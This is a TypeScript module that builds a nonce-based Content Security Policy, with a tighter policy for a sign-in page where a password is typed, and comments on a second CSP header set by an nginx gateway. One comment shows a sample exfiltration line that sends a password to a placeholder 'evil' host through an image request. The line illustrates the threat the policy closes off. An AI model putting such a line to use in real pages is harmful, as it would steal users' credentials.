/**
 * Content Security Policy.
 *
 * ════════════════════════════════════════════════════════════════════════════
 * ⚠⚠ THIS IS NOT THE ONLY POLICY ON THE RESPONSE, AND THE OTHER ONE IS WIDER
 * ════════════════════════════════════════════════════════════════════════════
 * Measured on 2026-09-28 at `/v2/en/sign-in`: the response carries **two**
 * `content-security-policy` headers. Ours, and one from the gateway containing
 * `'unsafe-inline'`, `'unsafe-eval'`, `img-src … https:` and
 * `script-src … https://connect.facebook.net`.
 *
 * **Our narrowing still holds.** A browser enforces every policy present
 * independently, so a resource must satisfy all of them and the effective result
 * is the intersection. A wildcard over there cannot widen a restriction here.
 *
 * ★ BUT THE GATEWAY DEFINES IT NINE TIMES, NOT ONCE. `nginx/security-headers.conf`
 *   and eight `add_header` lines across `nginx.conf.template` and
 *   `gateway/nginx.prod.conf.template`, with different values per server and
 *   location block — the one on `dev.gotcha.co.il` is not the one in
 *   `security-headers.conf`. Which applies depends on which block matches, and
 *   **nginx's `add_header` inheritance is all-or-nothing**: a block that defines
 *   any `add_header` drops every inherited one. So the second policy can change,
 *   or disappear, without anybody editing this file.
 *
 * ── WHAT FOLLOWS, AND IT IS WHY THIS NOTE EXISTS ──
 * 1. Somebody debugging a blocked resource will search this file for a directive
 *    that lives in nginx. The reasoning below reads as complete and is one of
 *    two sources.
 * 2. **The coupling is one-way.** A future narrowing in nginx can break a route
 *    without touching this file; a future widening there cannot help it.
 * 3. Therefore this policy is written to be **self-sufficient** — every
 *    directive we rely on is named here rather than left to fall back to the
 *    other policy or to `default-src`. If the gateway's header vanished
 *    tomorrow, the page would be exactly as protected. There is a test for that.
 *
 * Collapsing the two is a change to the existing product's headers and is not
 * ours to make unilaterally.
 *
 * CSP is the control that turns a successful script injection into a blocked
 * console message. It matters most in a product like this one, where the page
 * renders customer-authored text all day.
 *
 * Nonce-based rather than `unsafe-inline`. The App Router emits its own inline
 * bootstrap and RSC payload scripts, so a policy without either a nonce or
 * `unsafe-inline` would break the application entirely - and `unsafe-inline`
 * is close to having no script policy at all. `strict-dynamic` then lets those
 * nonce-approved scripts load the chunks they need without every chunk URL
 * having to be enumerated.
 */
export function buildContentSecurityPolicy(options: {
  readonly nonce: string;
  readonly realtimeUrl?: string;
  readonly isDevelopment: boolean;
  /**
   * ════════════════════════════════════════════════════════════════════════
   * ★★ A PAGE WHERE SOMEBODY TYPES A PASSWORD GETS A NARROWER POLICY
   * ════════════════════════════════════════════════════════════════════════
   * Screen 00a renders a password field in our own bundle, which is a real
   * change: until now the credential was typed on the identity provider's
   * origin and an XSS here could not reach it. The architecture's claim is that
   * **our server** never sees the password — our JavaScript does, and this is
   * the control that narrows what an injected script could do with it.
   *
   * ★ `img-src https:` IS THE ONE THAT MATTERS, and it is easy to miss because
   *   images feel harmless. `new Image().src = 'https://evil/?p=' + password`
   *   exfiltrates over a channel `connect-src` does not govern. The general
   *   policy allows `https:` because the product renders customer avatars and
   *   product photos from wherever a merchant's shop hosts them. **The sign-in
   *   screen renders none of that** — its only image is an inline SVG logo — so
   *   the wildcard buys nothing there and costs the whole exfiltration path.
   *
   * `media-src` is the same channel in a different tag. `connect-src` loses the
   * realtime origins, which are not used before anybody has signed in. And
   * `frame-src` goes to `none`: an injected iframe is another way to carry a
   * value off the page.
   *
   * ⚠ WHAT THIS DOES NOT DO: it does not stop a script that is already running
   * in our origin from reading the field. Nothing in a CSP does. It removes the
   * ways the value leaves, which is the half that is achievable.
   */
  readonly credentialSurface?: boolean;
}): string {
  const { nonce, realtimeUrl, isDevelopment, credentialSurface = false } = options;

  // The realtime gateway is a separate origin, and Socket.IO upgrades to a
  // websocket, so both the https and wss origins have to be allowed.
  const realtimeOrigins = realtimeUrl
    ? [realtimeUrl, realtimeUrl.replace(/^https:/, 'wss:').replace(/^http:/, 'ws:')]
    : [];

  const directives: Record<string, readonly string[]> = {
    'default-src': ["'self'"],
    'script-src': [
      "'self'",
      `'nonce-${nonce}'`,
      "'strict-dynamic'",
      // Turbopack's dev runtime evaluates code at runtime. Never in production.
      ...(isDevelopment ? ["'unsafe-eval'"] : []),
    ],
    // Styles stay `unsafe-inline`: React sets element `style` attributes, and
    // there is no nonce mechanism for those. Inline style cannot execute
    // script, so this is a far smaller exposure than inline script would be.
    'style-src': ["'self'", "'unsafe-inline'"],
    /*
     * `https:` because a merchant's product photos and a customer's avatar come
     * from wherever their shop hosts them, and enumerating that is not possible.
     * Not on a credential surface, where nothing is rendered from off-origin.
     */
    'img-src': credentialSurface ? ["'self'", 'data:'] : ["'self'", 'data:', 'blob:', 'https:'],
    'font-src': ["'self'", 'data:'],
    'connect-src': credentialSurface
      ? ["'self'"]
      : ["'self'", ...realtimeOrigins, ...(isDevelopment ? ['ws:'] : [])],
    'media-src': credentialSurface ? ["'none'"] : ["'self'", 'blob:', 'https:'],
    // No plugins, ever.
    'object-src': ["'none'"],
    // Stops an injected <base> silently repointing every relative URL.
    'base-uri': ["'self'"],
    'form-action': ["'self'"],
    // The clickjacking control. Repeated as X-Frame-Options for old browsers.
    'frame-ancestors': ["'none'"],
    'frame-src': credentialSurface ? ["'none'"] : ["'self'"],
    ...(isDevelopment ? {} : { 'upgrade-insecure-requests': [] }),
  };

  return Object.entries(directives)
    .map(([directive, values]) =>
      values.length > 0 ? `${directive} ${values.join(' ')}` : directive,
    )
    .join('; ');
}

export const NONCE_HEADER = 'x-nonce';

export function generateNonce(): string {
  // 16 bytes of randomness, base64. Unguessable, and regenerated per request -
  // a reused nonce is no better than `unsafe-inline`.
  const bytes = globalThis.crypto.getRandomValues(new Uint8Array(16));
  return btoa(String.fromCharCode(...bytes));
}
